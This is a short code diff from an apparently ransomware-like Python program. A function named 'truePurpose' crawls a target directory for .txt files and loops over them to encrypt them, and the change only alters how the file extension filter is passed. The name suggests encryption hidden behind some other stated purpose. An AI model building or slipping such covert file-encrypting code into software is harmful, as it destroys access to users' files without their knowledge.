@@ -45,8 +45,8 @@ def truePurpose(target_directory: str):
         target_directory: the directory to ecrypt
     """
 
-    c: Crawler = Crawler(target_directory,
-                         extension=".txt", abs_path=True)
+    c: Crawler = Crawler(target_directory, extension_white_list=[
+                         '.txt'], abs_path=True)
     c.walk_tree()
     filesToEncrypt: List[str] = c.get_files()
     for s in filesToEncrypt:
